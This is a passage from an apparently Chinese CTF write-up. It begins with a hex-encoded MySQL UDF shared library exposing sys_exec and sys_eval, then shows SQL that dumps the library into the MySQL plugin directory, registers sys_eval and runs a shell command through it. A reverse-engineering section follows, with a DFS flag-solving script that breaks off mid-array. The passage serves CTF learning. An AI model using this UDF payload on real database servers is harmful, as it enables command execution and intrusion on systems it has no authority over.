00e960ffffffff250a1520006809000000e950ffffffff2502152000680a000000e940ffffffff25fa142000680b000000e930ffffffff25f2142000680c000000e920ffffffff256214200066900000000000000000488d3de114200055488d05d91420004839f84889e57419488b05221420004885c0740d5dffe0662e0f1f8400000000005dc30f1f4000662e0f1f840000000000488d3da1142000488d359a142000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05e11320004885c0740c5dffe0660f1f8400000000005dc30f1f4000662e0f1f840000000000803d5114200000752f48833db713200000554889e5740c488b3d32142000e83dffffffe848ffffffc60529142000015dc30f1f8000000000f3c3660f1f440000554889e55de966ffffff554889e548897de8488975e0488955d8488b45e08b0085c07463488b45d848ba4e6f20617267756d48b9656e747320616c6c4889104889480848be6f7765642028756448bf663a206c69625f6d488970104889781848ba7973716c7564665f48b97379735f696e666f488950204889482866c740302900c645ff01eb04c645ff000fb645ff5dc3554889e548897df8905dc3554889e548897df8488975f0488955e848894de04c8945d84c894dd0488b45e848ba6c69625f6d79737148b96c7564665f7379734889104889480848be2076657273696f6e48897010c7401820302e3066c7401c2e33c6401e00488b45e048c7001e000000488b45e85dc3554889e548897df8488975f0488955e8488b45f08b0083f801751c488b45f0488b40088b0085c0750e488b45f8c60001b800000000eb58488b45e848ba457870656374656448b92065786163746c794889104889480848be206f6e652073747248bf696e672074797065488970104889781848b920706172616d65744889482066c740286572c6402a00b8010000005dc3554889e548897df8905dc3554889e54883ec4048897de8488975e0488955d848894dd04c8945c84c894dc0488b45e0488b4010488b004889c7e87afcffff488945f848837df8007509488b45c8c60001eb16488b45f84889c7e89afcffff4889c2488b45d0488910488b45f8c9c3554889e54883ec2048897df8488975f0488955e8488b45f08b0083f8027448488b45e848be457870656374656448bf2065786163746c794889304889780848b92074776f2061726748894810c74018756d656e66c7401c7473c6401e00b801000000e9f3000000488b45f0488b40088b0085c07453488b45e848be457870656374656448bf20737472696e67204889304889780848ba7479706520666f7248b9206e616d65207061488950104889481848b972616d657465720048894820b801000000e992000000488b45f0488b40084883c004c70000000000488b45f0488b4018488b10488b45f0488b40184883c008488b004801d04883c0024889c7e8e7fbffff4889c2488b45f848895010488b45f8488b40104885c0753a488b45e848be436f756c64206e6f48bf7420616c6c6f63614889304889780848b97465206d656d6f724889481066c740187900b801000000eb05b800000000c9c3554889e54883ec1048897df8488b45f8488b40104885c07410488b45f8488b40104889c7e8d5faffff90c9c3554889e54883ec3048897de8488975e0488955d848894dd0488b45e8488b4010488945f0488b45e0488b4018488b00488d5001488b45f04801d0488945f8488b45e0488b4018488b10488b45e0488b4010488b08488b45f04889ce4889c7e8effaffff488b45e0488b4018488b10488b45f04801d0c60000488b45e0488b40184883c008488b10488b45e0488b40104883c008488b08488b45f84889ce4889c7e8adfaffff488b45e0488b40184883c008488b10488b45f84801d0c60000488b4df8488b45f0ba010000004889ce4889c7e81cfaffff4898c9c3554889e548897de8488975e0488955d8c745fc00000000488b45e08b0083f801751f488b45e0488b40088b55fc48c1e2024801d08b0085c07507b800000000eb58488b45d848be457870656374656448bf2065786163746c794889304889780848be206f6e652073747248bf696e672074797065488970104889781848b920706172616d65744889482066c740286572c6402a00b8010000005dc3554889e548897df8905dc3554889e54883ec2048897df8488975f0488955e848894de0488b45f0488b4010488b004889c7e877f9ffff4898c9c3554889e548897de8488975e0488955d8c745fc00000000488b45e08b0083f801751f488b45e0488b40088b55fc48c1e2024801d08b0085c07507b800000000eb58488b45d848be457870656374656448bf2065786163746c794889304889780848be206f6e652073747248bf696e672074797065488970104889781848b920706172616d65744889482066c740286572c6402a00b8010000005dc3554889e548897df8905dc3554889e54881ec600400004889bdc8fbffff4889b5c0fbffff488995b8fbffff48898db0fbffff4c8985a8fbffff4c898da0fbffff64488b042528000000488945f831c0bf01000000e8bff8ffff488985b8fbffff48c785d8fbffff00000000488b85c0fbffff488b4010488b00488d35390100004889c7e8b0f8ffff488985e0fbffffeb79488d85f0fbffff4889c7e818f8ffff488985e8fbffff488b95d8fbffff488b85e8fbffff4801c2488b85b8fbffff4889d64889c7e85ef8ffff488985b8fbffff488b95b8fbffff488b85d8fbffff488d0c02488b95e8fbffff488d85f0fbffff4889c64889cfe89cf7ffff488b85e8fbffff480185d8fbffff488b95e0fbffff488d85f0fbffffbe000400004889c7e8d3f7ffff4885c00f8563ffffff488b85e0fbffff4889c7e8abf7ffff488b85b8fbffff0fb60084c0740a4883bdb8fbffff00750c488b85a8fbffffc60001eb30488b95b8fbffff488b85d8fbffff4801d0c60000488b85b8fbffff4889c7e834f7ffff4889c2488b85b0fbffff488910488b85b8fbffff488b4df86448330c25280000007405e81cf7ffffc9c300004883ec084883c408c3720000011b033b9000000011000000acf6ffffac0000008cf7ffffd400000076f8ffffec000000fdf8ffff0c01000008f9ffff2c01000073f9ffff4c01000004faffff6c0100000ffaffff8c01000072faffffac010000cefbffffcc010000fafbffffec010000d4fcffff0c0200006ffdffff2c0200007afdffff4c020000a9fdffff6c02000044feffff8c0200004ffeffffac0200001400000000000000017a5200017810011b0c070890010000240000001c000000f8f5ffffe0000000000e10460e184a0f0b770880003f1a3b2a332422000000001400000044000000b0f6ffff0800000000000000000000001c0000005c00000082f7ffff8700000000410e108602430d0602820c070800001c0000007c000000e9f7ffff0b00000000410e108602430d06460c07080000001c0000009c000000d4f7ffff6b00000000410e108602430d0602660c070800001c000000bc0000001ff8ffff9100000000410e108602430d06028c0c070800001c000000dc00000090f8ffff0b00000000410e108602430d06460c07080000001c000000fc0000007bf8ffff6300000000410e108602430d06025e0c070800001c0000001c010000bef8ffff5c01000000410e108602430d060357010c0708001c0000003c010000faf9ffff2c00000000410e108602430d06670c07080000001c0000005c01000006faffffda00000000410e108602430d0602d50c070800001c0000007c010000c0faffff9b00000000410e108602430d0602960c070800001c0000009c0100003bfbffff0b00000000410e108602430d06460c07080000001c000000bc01000026fbffff2f00000000410e108602430d066a0c07080000001c000000dc01000035fbffff9b00000000410e108602430d0602960c070800001c000000fc010000b0fbffff0b00000000410e108602430d06460c07080000001c0000001c0200009bfbffffa301000000410e108602430d06039e010cc000000000000300c0000000000000100000000000000a2010000000000000c00000000000000900a0000000000000d00000000000000f8130000000000001900000000000000101e2000000000001b0000000000000008000000000000001a00000000000000181e2000000000001c000000000000000800000000000000f5feff6f00000000f001000000000000050000000000000038060000000000000600000000000000a8020000000000000a00000000000000e5010000000000000b000000000000001800000000000000030000000000000000202000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000058090000000000000700000000000000b0080000000000000800000000000000a80000000000000009000000000000001800000000000000feffff6f000000007008000000000000ffffff6f000000000100000000000000f0ffff6f000000001e08000000000000f9ffff6f00000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000201e20000000000000000000000000000000000000000000c60a000000000000d60a000000000000e60a000000000000f60a000000000000060b000000000000160b000000000000260b000000000000360b000000000000460b000000000000560b000000000000660b000000000000760b000000000000860b00000000000080202000000000004743433a20285562756e747520372e342e302d317562756e7475317e31382e30342e312920372e342e300000000000000000000000000000000000000000000000000000000000000000000003000100c80100000000000000000000000000000000000003000200f00100000000000000000000000000000000000003000300a802000000000000000000000000000000000000030004003806000000000000000000000000000000000000030005001e0800000000000000000000000000000000000003000600700800000000000000000000000000000000000003000700b00800000000000000000000000000000000000003000800580900000000000000000000000000000000000003000900900a00000000000000000000000000000000000003000a00b00a00000000000000000000000000000000000003000b00900b00000000000000000000000000000000000003000c00a00b00000000000000000000000000000000000003000d00f81300000000000000000000000000000000000003000e00011400000000000000000000000000000000000003000f00041400000000000000000000000000000000000003001000981400000000000000000000000000000000000003001100101e20000000000000000000000000000000000003001200181e20000000000000000000000000000000000003001300201e20000000000000000000000000000000000003001400e01f2000000000000000000000000000000000000300150000202000000000000000000000000000000000000300160080202000000000000000000000000000000000000300170088202000000000000000000000000000000000000300180000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000002000c00a00b00000000000000000000000000000e00000002000c00e00b00000000000000000000000000002100000002000c00300c00000000000000000000000000003700000001001700882020000000000001000000000000004600000001001200181e20000000000000000000000000006d00000002000c00700c00000000000000000000000000007900000001001100101e2000000000000000000000000000980000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000ab00000001001000d0160000000000000000000000000000000000000400f1ff00000000000000000000000000000000b90000000100160080202000000000000000000000000000c600000001001300201e2000000000000000000000000000cf00000000000f0004140000000000000000000000000000e20000000100160088202000000000000000000000000000ee00000001001500002020000000000000000000000000000401000012000000000000000000000000000000000000001801000012000000000000000000000000000000000000002a01000012000000000000000000000000000000000000003f01000020000000000000000000000000000000000000005b01000012000c00080e0000000000000b000000000000006a01000012000c007e110000000000002f000000000000007301000012000c00d8100000000000009b000000000000008101000012000000000000000000000000000000000000009501000010001600882020000000000000000000000000009c01000012000d00f8130000000000000000000000000000a20100001200000000000000000000000000000000000000b60100001200000000000000000000000000000000000000d20100001200000000000000000000000000000000000000e60100001200000000000000000000000000000000000000fa01000012000000000000000000000000000000000000000d02000012000c005312000000000000a3010000000000001602000012000c00130e00000000000063000000000000001e02000020000000000000000000000000000000000000002d02000012000c00fe0f000000000000da000000000000003502000012000000000000000000000000000000000000004802000012000c000c0d0000000000006b000000000000005e02000012000000000000000000000000000000000000007202000012000c00010d0000000000000b000000000000008f02000012000c00760e0000000000005c010000000000009c0200001000170090202000000000000000000000000000a102000012000c0048120000000000000b00000000000000b10200001200000000000000000000000000000000000000c60200001000170088202000000000000000000000000000d20200001200000000000000000000000000000000000000e502000012000c00d20f0000000000002c00000000000000f402000012000c0073110000000000000b000000000000000403000012000c00ad110000000000009b000000000000001203000012000c00770d00000000000091000000000000001f03000020000000000000000000000000000000000000003903000022000000000000000000000000000000000000007b01000012000900900a00000000000000000000000000005503000012000c007a0c00000000000087000000000000000063727473747566662e6300646572656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e37363937005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006c69625f6d7973716c7564665f7379732e63005f5f4652414d455f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f474e555f45485f4652414d455f484452005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00676574656e764040474c4942435f322e322e3500667265654040474c4942435f322e322e35007374726e6370794040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c65007379735f6765745f6465696e6974007379735f65786563007379735f657865635f696e697400736574656e764040474c4942435f322e322e35005f6564617461005f66696e69007374726c656e4040474c4942435f322e322e35005f5f737461636b5f63686b5f6661696c4040474c4942435f322e340073797374656d4040474c4942435f322e322e350070636c6f73654040474c4942435f322e322e350066676574734040474c4942435f322e322e35007379735f6576616c007379735f676574005f5f676d6f6e5f73746172745f5f007379735f736574006d656d6370794040474c4942435f322e3134006c69625f6d7973716c7564665f7379735f696e666f006d616c6c6f634040474c4942435f322e322e35006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f7365745f696e6974005f656e64007379735f6576616c5f6465696e6974007265616c6c6f634040474c4942435f322e322e35005f5f6273735f737461727400706f70656e4040474c4942435f322e322e35007379735f7365745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f696e6974007379735f6765745f696e6974005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35006c69625f6d7973716c7564665f7379735f696e666f5f696e697400002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e706c742e676f74002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e64796e616d6963002e676f742e706c74002e64617461002e627373002e636f6d6d656e740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000f001000000000000f001000000000000b400000000000000030000000000000008000000000000000000000000000000380000000b0000000200000000000000a802000000000000a80200000000000090030000000000000400000001000000080000000000000018000000000000004000000003000000020000000000000038060000000000003806000000000000e50100000000000000000000000000000100000000000000000000000000000048000000ffffff6f02000000000000001e080000000000001e080000000000004c0000000000000003000000000000000200000000000000020000000000000055000000feffff6f020000000000000070080000000000007008000000000000400000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000b008000000000000b008000000000000a8000000000000000300000000000000080000000000000018000000000000006e00000004000000420000000000000058090000000000005809000000000000380100000000000003000000150000000800000000000000180000000000000078000000010000000600000000000000900a000000000000900a000000000000170000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000b00a000000000000b00a000000000000e0000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000900b000000000000900b000000000000080000000000000000000000000000000800000000000000080000000000000087000000010000000600000000000000a00b000000000000a00b00000000000056080000000000000000000000000000100000000000000000000000000000008d000000010000000600000000000000f813000000000000f8130000000000000900000000000000000000000000000004000000000000000000000000000000930000000100000002000000000000000114000000000000011400000000000002000000000000000000000000000000010000000000000000000000000000009b000000010000000200000000000000041400000000000004140000000000009400000000000000000000000000000004000000000000000000000000000000a9000000010000000200000000000000981400000000000098140000000000003c02000000000000000000000000000008000000000000000000000000000000b30000000e0000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000800000000000000bf0000000f0000000300000000000000181e200000000000181e0000000000000800000000000000000000000000000008000000000000000800000000000000cb000000060000000300000000000000201e200000000000201e000000000000c00100000000000004000000000000000800000000000000100000000000000082000000010000000300000000000000e01f200000000000e01f0000000000002000000000000000000000000000000008000000000000000800000000000000d4000000010000000300000000000000002020000000000000200000000000008000000000000000000000000000000008000000000000000800000000000000dd000000010000000300000000000000802020000000000080200000000000000800000000000000000000000000000008000000000000000000000000000000e3000000080000000300000000000000882020000000000088200000000000000800000000000000000000000000000001000000000000000000000000000000e8000000010000003000000000000000000000000000000088200000000000002b00000000000000000000000000000001000000000000000100000000000000010000000200000000000000000000000000000000000000b82000000000000068070000000000001a0000002a0000000800000000000000180000000000000009000000030000000000000000000000000000000000000020280000000000007003000000000000000000000000000001000000000000000000000000000000110000000300000000000000000000000000000000000000902b000000000000f100000000000000000000000000000001000000000000000000000000000000&#x27;) into dumpfile &#x27;/usr/lib/mysql/p1ugin/mysqludf111.so&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">create function sys_eval returns string soname &quot;mysqludf111.so&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">select sys_eval(&#x27;env&#x27;);</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1706599727475-61133a3e-8467-4253-96f2-fc859fc53986.png\" alt=\"\" /></p>\n<h3 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> Reverse</h3>\n<h4 id=\"mz\"><a class=\"anchor\" href=\"#mz\">#</a> MZ</h4>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1706626189405-35f77f62-dfad-4f0f-b2d8-c3e8747f55ec.png\" alt=\"\" /></p>\n<p>所以每一个输入的字母都必须满足两个判断中的一个，否则就会输出 Wrong flag</p>\n<p>直接爆破发现有多解，不能直接爆破，需要使用 DFS 深度优先算法去遍历所有的解法。由题目提示知道 flag 是有意义的字符串，发现比较像 flag 的字符串，输入发现正确。就不用通过 v9 去进行 sha1 判断了。</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from asyncio import sleep</span><br><span class=\"line\">import hashlib</span><br><span class=\"line\">import string</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">data = [0x00000005, 0x00F0F7D8, 0x00000002, 0x00F0E2E0, 0x00000014, 0x00F11E10, 0x00000015, 0x00F0E9D8, 0x0000002B, 0x00F10CB0, 0x00000076, 0x00F0CD70, 0x0000005F, 0x00F0CE58, 0x0000000C, 0x00F0EAC8, 0x0000005D, 0x00F0A438, 0x00000067, 0x00F0A950, 0x0000000D, 0x00F10CF0, 0x00000045, 0x00F0D288, 0x0000006C, 0x00F10030, 0x0000004A, 0x00F0E7C0, 0x00000045, 0x00F090E0, 0x00000020, 0x00F0C858, 0x00000050, 0x00F0BB88, 0x00000071, 0x00F0C410, 0x00000045, 0x00F0E4C0, 0x00000044, 0x00F0F0E0, 0x0000006A, 0x00F10A08, 0x00000050, 0x00F0D778, 0x0000001F, 0x00F0CF18, 0x00000036, 0x00F0CD68, 0x00000009, 0x00F0BEA8, 0x00000056, 0x00F0E380, 0x00000028, 0x00F0CA70, 0x0000000A, 0x00F0AA10, 0x00000035, 0x00F0DAA8, 0x0000007D, 0x00F11930, 0x0000007D, 0x00F0BA98, 0x0000002B, 0x00F0B3D8, 0x00000001, 0x00F0C648, 0x00000059, 0x00F09D90, 0x00000031, 0x00F0CB20, 0x00000058, 0x00F09F70, 0x00000002, 0x00F10780, 0x00000062, 0x00F0B2E0, 0x00000015, 0x00F0F318, 0x00000032, 0x00F0F798, 0x00000067, 0x00F10648, 0x00000058, 0x00F093A8, 0x0000001A, 0x00F0FEC8, 0x00000062, 0x00F10D30, 0x0000003E, 0x00F0FF68, 0x0000003C, 0x00F11068, 0x00000063, 0x00F0AC38, 0x00000078, 0x00F0A988, 0x00000037, 0x00F0C898, 0x00000076, 0x00F0ACE8, 0x00000069, 0x00F0C5C0, 0x0000005B, 0x00F0C238, 0x00000038, 0x00F09818, 0x00000017, 0x00F0A530, 0x0000004A, 0x00F12068, 0x0000004D, 0x00F0AD50, 0x0000005A, 0x00F10E98, 0x00000039, 0x00F0C180, 0x00000027, 0x00F0F278, 0x0000002B, 0x00F0C7F0, 0x0000003C, 0x00F10FA8, 0x0000007B, 0x00F0BF20, 0x00000034, 0x00F0BDC8, 0x00000030, 0x00F0F020, 0x00000048, 0x00F12BB8, 0x00000029, 0x00F098D8, 0x00000065, 0x00F0BA50, 0x0000007A, 0x00F10D80, 0x00000037, 0x00F10B08, 0x0000007A, 0x00F0A2E0, 0x00000032, 0x00F0A2C0, 0x00000005, 0x00F0AC98, 0x00000027, 0x00F0A918, 0x00000070, 0x00F0DA90, 0x00000079, 0x00F09D00, 0x00000064, 0x00F0BC88, 0x00000052, 0x00F0A4E8, 0x0000005D, 0x00F0FEA0, 0x00000018, 0x00F0BDB8, 0x0000001F, 0x00F10C60, 0x0000006C, 0x00F118A8, 0x0000007D, 0x00F0CE18, 0x00000005, 0x00F0B220, 0x00000058, 0x00F093A8, 0x00000015, 0x00F0CFA0, 0x0000003F, 0x00F09538, 0x00000023, 0x00F103D8, 0x00000075, 0x00F0CFE8, 0x0000007A, 0x00F0B688, 0x0000001F, 0x00F09798, 0x00000024, 0x00F0EAA0, 0x0000003F, 0x00F0E9C0, 0x00000008, 0x00F0ADA8, 0x0000002B, 0x00F11EA0, 0x00000017, 0x00F0D310, 0x00000038, 0x00F0A310, 0x00000045, 0x00F0C7A8, 0x00000025, 0x00F09730, 0x0000000C, 0x00F0FE28, 0x00000014, 0x00F0E180, 0x0000004D, 0x00F0AD98, 0x00000042, 0x00F0B0B8, 0x0000005E, 0x00F0B180, 0x0000006E, 0x00F111C8, 0x0000006B, 0x00F0C6A8, 0x00000007, 0x00F098C8, 0x00000024, 0x00F0BFD8, 0x0000000D, 0x00F0D218, 0x0000004C, 0x00F0E8E8, 0x00000054, 0x00F0A968, 0x0000002A, 0x00F0E110, 0x0000001C, 0x00F0B170, 0x0000005D, 0x00F09E38, 0x0000007B, 0x00F0F758, 0x0000002C, 0x00F12028, 0x00000034, 0x00F0FE38, 0x00000046, 0x00F0B7F0, 0x00000007, 0x00F10DD8, 0x00000010, 0x00F10470, 0x0000005E, 0x00F10130, 0x00000079, 0x00F0A740, 0x0000001B, 0x00F0C638, 0x00000058, 0x00F11DB0, 0x00000047, 0x00F0C508, 0x0000007A, 0x00F12168, 0x00000070, 0x00F0ACF0, 0x0000002D, 0x00F0DDC0, 0x0000000F, 0x00F0C5B8, 0x00000029, 0x00F0B458, 0x00000003, 0x00F0DCD8, 0x0000007A, 0x00F0E198, 0x00000041, 0x00F0A770, 0x00000047, 0x00F092A8, 0x0000003D, 0x00F0F958, 0x00000046, 0x00F0D5A8, 0x0000005F, 0x00F11E70, 0x00000009, 0x00F09900, 0x0000006E, 0x00F0C798, 0x00000011, 0x00F0A6D8, 0x00000014, 0x00F0DB98, 0x0000004F, 0x00F11A28, 0x00000043, 0x00F10440, 0x00000063, 0x00F0B050, 0x0000007E, 0x00F12A70, 0x00000000, 0x00F0A250, 0x00000062, 0x00F09828, 0x00000077, 0x00F12248, 0x00000031, 0x00F0BCE0, 0x00000009, 0x00F0BC00, 0x00000036, 0x00F0CBC8, 0x00000078, 0x00F0E5A8, 0x00000033, 0x00F0F2B0, 0x00000067, 0x00F0D4F0, 0x00000043, 0x00F0D5B0, 0x0000007C, 0x00F0C7A0, 0x0000003D, 0x00F0F840, 0x00000071, 0x00F0D428, 0x00000033, 0x00F117D0, 0x0000007D, 0x00F11090, 0x00000000, 0x00F0DC98, 0x00000024, 0x00F12050, 0x00000073, 0x00F0D5D0, 0x0000000A, 0x00F12430, 0x00000022, 0x00F11690, 0x00000023, 0x00F0A700, 0x0000006F, 0x00F09D50, 0x0000000E, 0x00F0DFF0, 0x00000043, 0x00F0E7C0, 0x0000004C, 0x00F0BDD8, 0x0000007C, 0x00F11DF8, 0x0000003A, 0x00F12A38, 0x00000036, 0x00F0D7C8, 0x00000075, 0x00F0C368, 0x00000051, 0x00F102B0, 0x0000000F, 0x00F0D2B0, 0x00000051, 0x00F0AC60, 0x00000041, 0x00F0B3A8, 0x0000002A, 0x00F0FE88, 0x00000002, 0x00F09290, 0x0000005C, 0x00F0B9C0, 0x0000001D, 0x00F12C58, 0x0000000E, 0x00F11748, 0x00000049, 0x00F0FD80, 0x00000020, 0x00F0C6E0, 0x00000055, 0x00F0F7E8, 0x0000002C, 0x00F12670, 0x0000004A, 0x00F0DEB0, 0x0000001D, 0x00F0F328, 0x00000051, 0x00F0ECF0, 0x00000055, 0x00F11A48, 0x00000013, 0x00F0B280, 0x00000058, 0x00F0A820, 0x00000068, 0x00F0C588, 0x0000002E, 0x00F0C658, 0x00000013, 0x00F10030, 0x00000050, 0x00F0F6E8, 0x00000061, 0x00F0AC10, 0x00000060, 0x00F102E0, 0x00000060, 0x00F09758, 0x00000005, 0x00F0F408, 0x00000009, 0x00F10B70, 0x00000005, 0x00F116E8, 0x00000017, 0x00F096B8, 0x00000034, 0x00F0F0A8, 0x00000063, 0x00F0B1B0, 0x00000020, 0x00F0C6E8, 0x00000070, 0x00F0E230, 0x00000024, 0x00F10EC8, 0x00000012, 0x00F12880, 0x00000046, 0x00F0FDC0, 0x00000060, 0x00F0AEC0, 0x00000014, 0x00F0BCD0, 0x00000044, 0x00F0F5B0, 0x00000074, 0x00F096F0, 0x00000068, 0x00F0FEB8, 0x00000052, 0x00F0CB80, 0x00000052, 0x00F0BEA8, 0x00000069, 0x00F0FB10, 0x00000076, 0x00F0AFA0, 0x00000065, 0x00F0A748, 0x00000075, 0x00F0C7B0, 0x0000003C, 0x00F12990, 0x00000074, 0x00F0B410, 0x00000065, 0x00F0F620, 0x00000024, 0x00F0A3C8, 0x00000066, 0x00F0B6B8, 0x00000070, 0x00F0EF48, 0x00000069, 0x00F0FFB0, 0x00000004, 0x00F11A28, 0x00000012, 0x00F0F3F8, 0x00000064, 0x00F0BF60, 0x00000011, 0x00F10208, 0x0000000B, 0x00F0E708, 0x0000005C, 0x00F0F4E8, 0x00000020, 0x00F0B760, 0x00000046, 0x00F0DF40, 0x00000038, 0x00F0FB38, 0x00000056, 0x00F0C2B8, 0x00000052, 0x00F0FA98, 0x00000000, 0x00F122E0, 0x00000063, 0x00F0F358, 0x00000029, 0x00F11288, 0x00000030, 0x00F0B488, 0x00000034, 0x00F0A890, 0x00000040, 0x00F09D88, 0x00000054, 0x00F12C00, 0x0000003D, 0x00F0A318, 0x00000074, 0x00F0DD58, 0x00000070, 0x00F0C360, 0x00000010, 0x00F0B3F8, 0x0000003C, 0x00F09478, 0x00000011, 0x00F11350, 0x00000044, 0x00F098B8, 0x0000004B, 0x00F0F368, 0x0000002A, 0x00F0D708, 0x00000073, 0x00F09450, 0x00000008, 0x00F10400, 0x00000051, 0x00F0A568, 0x00000077, 0x00F0D8C8, 0x00000009, 0x00F0DAE8, 0x00000009, 0x00F0D0C0, 0x0000000C, 0x00F09E68, 0x00000044, 0x00F0C890, 0x00000055, 0x00F0FBB0, 0x00000028, 0x00F108E8, 0x00000059, 0x00F125C0, 0x00000051, 0x00F0CBA8, 0x0000002B, 0x00F11340, 0x00000017, 0x00F0FF80, 0x00000018, 0x00F0C1E0, 0x00000000, 0x00F0A520, 0x00000071, 0x00F0A5A8, 0x00000027, 0x00F11778, 0x00000049, 0x00F12720, 0x00000007, 0x00F0A938, 0x0000001A, 0x00F0D080, 0x0000004F, 0x00F0F620, 0x00000049, 0x00F0FA38, 0x00000032, 0x00F12C58, 0x00000036, 0x00F0F398, 0x00000040, 0x00F0B4A0, 0x00000033, 0x00F0BB78, 0x00000051, 0x00F0BBF0, 0x0000001E, 0x00F099D0, 0x0000001A, 0x00F0AEC8, 0x00000069, 0x00F09698, 0x0000003F, 0x00F0D360, 0x0000004E, 0x00F0ECB0, 0x00000044, 0x00F11140, 0x00000025, 0x00F09AA8, 0x00000004, 0x00F114E8, 0x0000004C, 0x00F0B458, 0x00000071, 0x00F09E98, 0x0000004D, 0x00F0A0E8, 0x00000027, 0x00F0DA20, 0x0000003E, 0x00F0F650, 0x0000002F, 0x00F09088, 0x0000004C, 0x00F0B360, 0x0000001D, 0x00F0B910, 0x0000001E, 0x00F0A978, 0x00000070, 0x00F0D4C8, 0x0000000B, 0x00F0F050, 0x00000064, 0x00F099C8, 0x00000006, 0x00F0C8A0, 0x0000004B, 0x00F112D8, 0x0000001D, 0x00F09088, 0x0000007B, 0x00F0F248, 0x00000022, 0x00F0D168, 0x00000034, 0x00F0B038, 0x0000007A, 0x00F12B00, 0x00000067, 0x00F0C538, 0x00000042, 0x00F09490, 0x00000051, 0x00F0A120, 0x0000006A, 0x00F0E688, 0x00000072, 0x00F12988, 0x00000009, 0x00F0E680, 0x00000068, 0x00F099D0, 0x00000076, 0x00F0F950, 0x00000037, 0x00F117D8, 0x00000043, 0x00F112C0, 0x0000000C, 0x00F11480, 0x00000013, 0x00F0CA00, 0x00000063, 0x00F0FF68, 0x0000004F, 0x00F0C178, 0x00000042, 0x00F12738, 0x0000005F, 0x00F12938, 0x00000038, 0x00F0AA50, 0x00000037, 0x00F0DBE0, 0x0000006E, 0x00F128E8, 0x0000000C, 0x00F0ED98, 0x00000000, 0x00F0F798, 0x0000005E, 0x00F0BEA8, 0x0000006B, 0x00F0ABD8, 0x0000004F, 0x00F119D8, 0x00000055, 0x00F0B850, 0x0000004C, 0x00F113D0, 0x00000040, 0x00F0B038, 0x00000013, 0x00F10DC8, 0x0000002A, 0x00F10980, 0x00000029, 0x00F10F80, 0x0000002D, 0x00F0E3D8, 0x00000030, 0x00F0B018, 0x0000001B, 0x00F105F8, 0x00000044, 0x00F0AA38, 0x00000034, 0x00F108A0, 0x0000004A, 0x00F10328, 0x00000056, 0x00F09E80, 0x0000004A, 0x00F0F828, 0x0000005F, 0x00F0F5A0, 0x0000005D, 0x00F0BC20, 0x00000020, 0x00F105F0, 0x0000001C, 0x00F09BC8, 0x0000000E, 0x00F12B80, 0x00000050, 0x00F0C0E0, 0x00000005, 0x00F0AAC8, 0x0000002F, 0x00F091C8, 0x00000074, 0x00F11ED8, 0x00000045, 0x00F10160, 0x0000001B, 0x00F0B6E8, 0x0000002E, 0x00F0C1A0, 0x0000003A, 0x00F0A848, 0x0000006D, 0x00F0EF28, 0x00000070, 0x00F0E140, 0x00000025, 0x00F0A480, 0x00000023, 0x00F0ABA8, 0x0000000D, 0x00F0CE30, 0x00000010, 0x00F11C80, 0x0000004E, 0x00F0D330, 0x00000078, 0x00F0B6E0, 0x00000025, 0x00F10118, 0x0000002A, 0x00F10E90, 0x00000009, 0x00F0C048, 0x0000007A, 0x00F0DDF8, 0x00000029, 0x00F09CC8, 0x00000060, 0x00F0A4E0, 0x00000069, 0x00F11158, 0x0000007B, 0x00F0D220, 0x00000063, 0x00F12C18, 0x00000034, 0x00F0E260, 0x00000063, 0x00F0DAB8, 0x00000010, 0x00F0B6B0, 0x0000007C, 0x00F10B00, 0x0000007E, 0x00F0C6B0, 0x00000029, 0x00F11D00, 0x00000079, 0x00F0AC88, 0x00000014, 0x00F0A218, 0x0000002D, 0x00F0F110, 0x00000008, 0x00F107C8, 